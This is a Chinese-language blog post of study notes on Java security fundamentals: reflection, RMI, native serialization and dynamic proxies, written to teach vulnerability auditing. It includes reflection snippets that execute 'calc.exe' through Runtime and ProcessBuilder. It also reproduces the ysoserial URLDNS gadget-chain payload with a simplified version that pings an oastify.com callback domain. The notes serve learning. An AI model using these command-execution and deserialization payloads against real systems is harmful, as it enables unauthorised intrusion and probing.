---
title: java 基础知识笔记
categories:
- Note&Summary
tag:
- web
- java
- 反序列化
- 反射
date: 2025-10-20 13:56:07
excerpt: emmm加油更新
index_img: /img/java基础知识笔记/3703E54ABDAC5426C66722548CA800D6.jpg
banner_img: /img/java基础知识笔记/3703E54ABDAC5426C66722548CA800D6.jpg
---

# java 基础知识笔记

# 前言

学习实践了一些 java 反序列化漏洞之后发现其实很多时候只是跟着别人复现了一遍，自己未必真的就能做什么东西出来，以培养自己独立代码审计、挖掘漏洞的能力为目标，恶补一些基础内容。

# 反射

> 摘自 [withdong02 的 java 反射入门](https://withdong02.top/2025/08/10/Java%E5%8F%8D%E5%B0%84%E5%85%A5%E9%97%A8/)，先阅读一遍前置知识
> 编译器在编译 Java 源代码时会生成 `.class` 文件（字节码文件）。当 JVM 需要用到某个类时，它的类加载器会读取并解析对应的 `.class` 文件，在方法区（或元空间）构建该类的运行时数据结构，同时在堆内存中创建一个代表该类的 `java.lang.Class` 对象。每个被加载的类在 JVM 中都有且只有一个对应的 `Class` 对象（在同一个类加载器命名空间内）。
> 这里的 `Class` 是一个类的名字，不要和 `class` 关键字搞混。

Class 对象是反射的基石，反射就是操作 Class。

“正射”即在了解一个类的情况下，把该类实例化为一个对象，随后对这个对象进行操作

```java
Student student = new Student();
student.doHomework("数学")
```

“反射”即在不了解所需的类的情况下，像镜子一般在运行过程中通过相应的 Class 类获取对象实例对应的类的完整构造并调用对应方法

```
//先获取所需类的Class对象实例
//forname方法通过类名获取相应的类
Class clazz = Class.forName("reflection.Student");
//获取doHomework方法的Method对象
//getMethod通过反射获取一个类的某个特定public方法
//getMethod的两个参数分别为要调用的方法名，和该方法所需参数类型的Class对象（用于区分有重载的方法）
Method method = clazz.getMethod("doHomework", String.class);
//获取Constructor构造器对象
//getConstructor方法的参数取决于你拿到的构造器的参数
Constructor constructor =clazz.getConstructor();
//用构造器创建反射类实例对象
//newInstance方法的作用就是调用类的无参构造函数创建一个该类的实例（必须要有公开的无参构造函数）
Object object = constructor.newInstance();
//传入参数，调用方法
//invoke的两个参数分别是用于调用方法的对象，和调用方法要传入的具体参数
method.invoke(object, "语文");
```

反射的应用主要在于实现动态性，在程序运行的过程中可以动态地创建、操作实例对象（获取类的信息、操作字段、操作方法、操作构造器）。

![](/img/java基础知识笔记/JG1ebWTQaouHVexodSXcRZMWnqb.png)

上面我们提到要调用 newInstance 方法必须要有公开的无参构造函数，而实际中就可能遇到其他情况

1. 该类的构造函数为私有的
2. 该类没有无参构造函数

{% note warning %}

**补充说明**：
实际上，在 java9 及以后的版本中 clazz.newInstance()这种用法由于不安全性已被弃用，推荐使用的是 clazz.getConstructor().newInstance()，而这种用法可以根据传入的参数调用任意的构造方法，而不仅限于无参构造方法。getConstructor()的参数即为要获得的构造器的参数类型，newInstance()的参数即为要传入的具体参数。

{% endnote %}

例如 java.lang.Runtime 的无参构造函数为私有，无法直接通过 clazz.newInstance()创建实例（尝试发现，在高版本使用 clazz.getDeclaredConstructor().newInstance()，并 setAccessible(true)也无法达到目的，似乎更严密的封装机制拒绝了外部类的访问）。那么为什么 Runtime 的无参构造函数要设为私有呢？实际上 Runtime 类采用的设计模式是“单例模式”：无参构造函数设为私有，但编写一个静态方法用来获取实例，只有在类初始化时静态方法会执行一次构造函数，从而达到控制类的实例数量仅有一个的目的。

那么该如何解决这一问题呢？查看 Runtime 类可以发现，该类通过静态方法 getRuntime 来获取 Runtime 实例，所以调用 getRuntime 即可：

![](/img/java基础知识笔记/O8KZbeuv5oVJNCxhCuCc9nAFndf.png)

```java
Class clazz = Class.forName("java.lang.Runtime"); 
Method execMethod = clazz.getMethod("exec", String.class); 
Method getRuntimeMethod = clazz.getMethod("getRuntime"); //获取静态方法 getRuntime
Object runtime = getRuntimeMethod.invoke(clazz); //利用静态方法getRuntime获取Runtime实例
execMethod.invoke(runtime, "calc.exe"); //调用exec方法利用得到的Runtime实例，传入参数执行命令
```

以上的两个 invoke 使用略有不同，其第一个参数：

1. 如果这个方法是一个普通方法，那么第一个参数是类对象
2. 如果这个方法是一个静态方法，那么第一个参数是类

`getRuntimeMethod.invoke(clazz)` 是静态方法调用那么第一个参数即该方法的类

`execMethod.invoke(runtime, "calc.exe")` 是普通方法调用那么第一个参数是该类的对象

---

再比如另一种常用的执行命令方式 ProcessBuilder，它仅有两个含参构造函数

![](/img/java基础知识笔记/Z3tLbMnmcoNRYSxRlFBcFEtRnRb.png)

此处我们可以使用反射来获取其构造函数，然后调用 start()来执行命令。如下利用的是 ProcessBuilder(List<String> command)这一构造函数，传入 List<String>参数。start()方法的调用需要对象是 ProcessBuilder 所以必须进行强制类型转换，然而在利用漏洞的时候往往没有满足需求的上下文，所以这种方式并不好用。

```java
Class clazz = Class._forName_("java.lang.ProcessBuilder");
((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays._asList_("calc.exe"))).start();
```

所以可改为如下代码，getMethod("start")反射获取 start 方法，invoke 传参执行。

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));
```

那么如果想要使用 ProcessBuilder(String... command)又该怎么写呢？

这里涉及到 Java 里的可变长参数，方法里的 `...` 表示“这个函数的参数个数是可变的”，Java 在编译时就会将此处处理为数组，也就等价为 ProcessBuilder(String[] command)，所以如下获取该构造函数即可

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getConstructor(String[].class)
```

所以在调用 newInstance 时传给构造函数 ProcessBuilder(String[] command)的参数也同样使用数组，因为 newInstance 本身就需要数组参数，那么最终两者叠加就变成了一个二维数组

```java
Class clazz = Class.forName("java.lang.ProcessBuilder");
clazz.getMethod("start").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{"calc.exe"}}));
```

# RMI

RMI 全称是 Remote Method Invocation，即远程方法调用，让某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中对象的方法

```java
package rmi.example;

import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class rmiServer {

    public interface IRemoteHelloWorld extends Remote {
        public String hello() throws RemoteException;
    }
    public class RemoteHelloWorld extends UnicastRemoteObject implements
            IRemoteHelloWorld {
        protected RemoteHelloWorld() throws RemoteException {
            super();
        }
        public String hello() throws RemoteException {
            System._out_.println("call from");
            return "Hello world";
        }
    }
    private void start() throws Exception {
        RemoteHelloWorld h = new RemoteHelloWorld();
        LocateRegistry._createRegistry_(1099);
        Naming._rebind_("rmi://127.0.0.1:1099/Hello", h);
    }
    public static void main(String[] args) throws Exception {
        new rmiServer().start();
    }
}
```

一个 RMI Server 需要有三个部分：

1. 一个继承了 java.rmi.Remote 的接口，其中定义我们要远程调用的函数，比如这里的 hello()
2. 一个实现了此接口的类
3. 一个主类，用来创建 Registry，并将上面的类实例化后绑定到一个地址。这就是我们所谓的 Server 了。

```java
package rmi.example;

import rmi.example.rmiServer;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

public class rmiClient {
    public static void main(String[] args) throws Exception {
        rmiServer.IRemoteHelloWorld hello = (rmiServer.IRemoteHelloWorld) Naming._lookup_("rmi://127.0.0.1:1099/Hello");
        // rmi Server IP
        String ret = hello.hello();
        System._out_.println( ret);
    }
}
```

一个 RMI Client 则只需要用 Naming.lookup 在 Registry 中寻找到名字是 Hello 的对象，而后正常使用即可。

一次完整 RMI 通信的流程大致为：Client 发起第一次 TCP 连接向远程 registry 发送一个 Call 请求查找名为 hello 的对象，远程 registry 返回一个 ReturnData 包含所需对象的序列化数据，Client 反序列化该数据得到所需（远程）对象，于是发起第二次 TCP 连接调用远程方法，远程方法实际在远程 Server 上执行。

那么 RMI 技术会带来什么安全问题呢？

RMI Registry 相当于一个提供远程对象管理服务的地方，最直接的考虑就是 registry 能否控制：实际上 Java 早对 RMI Registry 的做了访问限制，只有来自 localhost 时才能调用 rebind、bind、unbind 等方法，除此之外 list、lookup 可远程调用，分别用于列出目标上所有绑定的对象和获取某个远程对象。

（这里还有一个 Codebase 的利用内容，暂时略过）

# 序列化与反序列化

一些序列化和反序列化相关的特性如下：

1. 类实现了 `Serializable` 才能序列化

```java
public class Animal implements Serializable {...}
```

1. 如果要序列化的对象的父类没有实现序列化接口，那么在反序列化时会调用父类的无参构造方法，反序列化后的结果中父类的属性为 null
2. 静态成员变量不能被序列化，序列化是针对对象属性的，而静态成员变量是属于类的。
3. transient 标识的对象成员变量不参与序列化
4. 序列化与反序列化的形式可以有 json、xml、原生等
5. 为满足特定需求，writeObject 和 readObject 都是可被重写的
6. 当服务端反序列化时就会自动执行客户端传递的类的 readObject 代码，从而形成安全隐患

```
可能的攻击情况
1.传递的入口类的readObject本身直接就会调用危险方法（基本无）
2.传递的入口类本身不调用危险方法，但参数中包含可控的类，该类有危险方法，在readObject处被调用
3.传递的入口类本身不调用危险方法，但参数中包含可控的类，该类可调用其他含危险方法的类
4.构造函数、静态代码块等在类加载过程中隐性执行

完整攻击满足
1.都继承Serializable
2.入口类source（满足：重写readObject，调用常见的函数，参数类型宽泛例如最后直接传递Object，最好jdk自带）
3.调用链gadget chain (根据相同名称、相同类型)
4.执行类sink (rce、ssrf、写文件)
```

---

以 [ysoserial 里的 URLDNS 链](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)为例入门一下 java 的反序列漏洞原理：

```java
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

URL 类可被序列化，其中包含 readObject 但是没有使用什么可利用的函数，而在 hashMap 类中 readObject 则会在最后使用 putVal 将 hash()处理后的 key 传入，达到反序列化时还原 hashMap 键值对的目的。而计算 hash 的过程中需要层层调用最终到达目标类中的 hashCode 方法完成计算，hashCode 方法又包含可利用操作，这就出现了可乘之机。

![](/img/java基础知识笔记/IctfbW7mToY4Tdxu7Z9ccmwWnYg.png)

我们进入 HashMap.hash()函数，它调用 key 自身的 hashCode 函数计算。

![](/img/java基础知识笔记/JZ3wb4fOqoNYeyx04y0cnx9vnRd.png)

URL 类中的 hashCode 函数如下，当 hashCode 值不为-1 时（初始默认值）直接返回（已经计算过 hashCode 不再重复），若为-1 则通过 handler 调用 hashCode()函数计算后返回。

![](/img/java基础知识笔记/P4sWbydMGoFijnx4qyCcS8PBnwf.png)

URL 类中此处使用的是 URLStreamHandler，查看其 hashCode()函数，其中就会使用 getHostAddress()函数获取域名对应的 ip 地址，也就是实现了 DNS 查询的过程。

![](/img/java基础知识笔记/ZlQdbEFEHohXVDxSEo5cjZtWnOP.png)

总结 URLDNS 的完整利用链

```java
/**
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *             URLStreamHandler.hashCode()
 *               URLStreamHandler.getHostAddress()
 *                 InetAddress._getByName_()
 *
 */
```

payload 编写思路即：

创建 URL 类对象写入正在监听 DNS 请求的域-->put 将 URL 对象放入 HashMap--> 序列化 HashMap

这里是一个简化的 URLDNS payload

```java
package Unserialization.example;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

import org.example.Serialization;
import org.example.Unserialization;//这里另外简单写的Serialization与Unserialization

@SuppressWarnings({ "rawtypes", "unchecked" })
public class URLDNS {

    public static void main(String[] args) throws Exception {

        //可以使用Burpsuite的Collaborator client功能监听DNS请求来验证攻击成功与否
        String url = "http://m0n1wabt3lm36f2kw6khfb7dp4v0jp.oastify.com";
        URL u = new URL(url);

        Class<?> Clazz = u.getClass();
        Field hashCode = Clazz.getDeclaredField("hashCode");
        hashCode.setAccessible(true);

        hashCode.set(u, 1);//避免生成payload时发起请求
        HashMap hashmap = new HashMap();
        hashmap.put(u, 1);
        hashCode.set(u, -1);//确保反序列化时生效

        Serialization._serialize_(hashmap);
        Unserialization._unserialize_("ser.bin");
    }

}
```

这里的 payload 不难发现比上面所说的思路似乎多了点东西。前面提过，URL 类中的 hashCode()会先判断 hashCode 值是否为初始值-1 来决定是否继续后面的 DNS 查询工作。

![](/img/java基础知识笔记/HuPVbFg2loUX9ix8MHYchvhCnEh.png)

而一个 HashMap 对象进行 put 操作时如下，也会使用 hash()函数处理 key 值。所以倘若直接使用 put 将所需的 URL 对象放入 HashMap 对象，那么放入时就会执行 DNS 查询（这是一个新建的 URL 对象），放入后 hashCode≠-1，生成的 payload 也就不能再实现 DNS 查询，成为无效的 payload。

![](/img/java基础知识笔记/UCgebJWr1opZMPxUPhucSFHdnkf.png)

因此我们需要在 put 操作前将 hashCode 值置为非-1，put 操作后再将 hashCode 值置为-1。

那么该如何实现这样的效果呢？这里就可以用到反射技术，在运行过程中动态的修改对象中的字段（注意 hashCode 是私有属性），在 put 之前 `hashCode.set(u, 1);` 避免生成 payload 时发起 DNS 请求，put 后 `hashCode.set(u, -1);` 重新置为-1 使其能在反序列化时生效。

# JDK 动态代理

代理模式是一种结构型设计模式，它为目标对象提供一种代理，用来控制对目标对象的访问。客户端通过代理对象间接地访问目标对象，而不需要直接与目标对象进行交互，可以在不改变目标对象内容的前提下通过代理对象扩展目标对象的行为逻辑。分为静态代理和动态代理。

静态代理是通过硬编码实现，代理类需要实现目标类已实现的所有接口，并在其中调用目标类的方法。（这样较为麻烦且在 web 环境中无法得知其内部所有接口）

动态代理则是在运行时动态创建代理类。其中 JDK 动态代理是基于接口实现的代理，只能代理实现了接口的类。实现步骤如下：

1. 创建实现 InvocationHandler 接口的代理类工厂：在调用 Proxy 类的静态方法 newProxyInstance 时，会动态生成一个代理类。该代理类实现了目标接口，并且持有一个 InvocationHandler 类型的引用。
2. InvocationHandler 接口：InvocationHandler 是一个接口，它只有一个方法 invoke。在代理对象的方法被调用时，JVM 会自动调用代理类的 invoke 方法，并将被调用的方法名、参数等信息传递给该方法。
3. 调用代理对象的方法：当代理对象的方法被调用时，JVM 会自动调用代理类的 invoke 方法。在 invoke 方法中，可以根据需要执行各种逻辑，比如添加日志、性能统计、事务管理等。
4. invoke 方法调用：在 invoke 方法中，通过反射机制调用目标对象的方法，并返回方法的返回值。在调用目标对象的方法前后，可以执行额外的逻辑。

```java
import java.lang.reflect.Proxy;
public class ProxyTest {
    public static void main(String[] args）{
        IUser user = new UserImpl();
        //动态代理
        //要代理的接口、要做的事情、cLassLoader
        InvocationHandLer userinvocationhandLer = new UserInvocationHandler(user);
        IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),
            user.getclass().getInterfaces(),
            userinvocationhandler);
        userProxy.update();
    }
}
```

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
public class UserInvocationHandler implements InvocationHandler {
    IUser user;
    public UserInvocationHandler(){
    }
    
    public UserInvocationHandler(IUser user){
        this.user = user;
    }
    @Override
    public Object invoke(object proxy, Method method,Object[] args) throws Throwable {
        System.out.println("调用了"+method.getName());
        method.invoke(user,args);
        return null;
    }
}
```

# 参考资料

- p 牛《Java 安全漫谈》
- B 站白日梦组长
- [withdong02 的 java 反射入门](https://withdong02.top/2025/08/10/Java%E5%8F%8D%E5%B0%84%E5%85%A5%E9%97%A8/)
